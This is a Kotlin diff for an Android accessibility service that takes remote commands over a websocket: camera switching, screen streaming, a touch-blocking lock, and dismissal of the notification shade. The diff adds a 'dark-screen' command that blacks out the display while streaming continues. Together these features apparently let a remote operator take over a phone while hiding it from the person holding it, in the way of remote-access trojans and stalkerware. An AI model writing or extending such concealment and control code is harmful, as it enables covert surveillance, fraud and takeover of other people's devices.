@@ -47,6 +47,7 @@ class ControlService : AccessibilityService() {
     private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
     private var overlayView: View? = null
     private var overlayParams: WindowManager.LayoutParams? = null
+    private var darkView: View? = null
     private val screenExecutor = Executors.newSingleThreadExecutor()
 
     // Periodically dismiss the notification shade and recents while overlay is locked.
@@ -145,6 +146,34 @@ class ControlService : AccessibilityService() {
         }
     }
 
+    private fun showDarkOverlay() {
+        if (darkView != null) return
+        if (!Settings.canDrawOverlays(this)) return
+        val params = WindowManager.LayoutParams(
+            WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams.MATCH_PARENT,
+            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+            PixelFormat.TRANSLUCENT
+        )
+        val view = View(this).apply { setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0)) }
+        darkView = view
+        ctrlHandler.post {
+            try { (getSystemService(WINDOW_SERVICE) as WindowManager).addView(view, params) }
+            catch (_: Exception) { darkView = null }
+        }
+    }
+
+    private fun hideDarkOverlay() {
+        val v = darkView ?: return
+        darkView = null
+        ctrlHandler.post {
+            try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v) } catch (_: Exception) {}
+        }
+    }
+
     private fun dispatchGestureWithOverlay(gesture: GestureDescription) {
         val v = overlayView
         val p = overlayParams
@@ -181,6 +210,11 @@ class ControlService : AccessibilityService() {
                 .setAction("SWITCH_CAM").putExtra("cam", msg.optString("cam", "back")))
             "touch-lock" -> ctrlHandler.post {
                 if (msg.optBoolean("locked", false)) showTouchBlockOverlay() else hideTouchBlockOverlay()
+            }
+            "dark-screen" -> ctrlHandler.post {
+                val on = msg.optBoolean("enabled", false)
+                StreamingService.darkScreen = on
+                if (on) showDarkOverlay() else hideDarkOverlay()
             }
             "screen-quality" -> {
                 StreamingService.screenQuality = msg.optInt("quality", 60).coerceIn(10, 90)
@@ -313,6 +347,8 @@ class ControlService : AccessibilityService() {
         instance = null
         resetLocks()
         hideTouchBlockOverlay()
+        hideDarkOverlay()
+        StreamingService.darkScreen = false
         wsControl?.close(1000, "stopped"); wsControl = null
         screenExecutor.shutdown()
         try { http.dispatcher.executorService.shutdown() } catch (_: Exception) {}
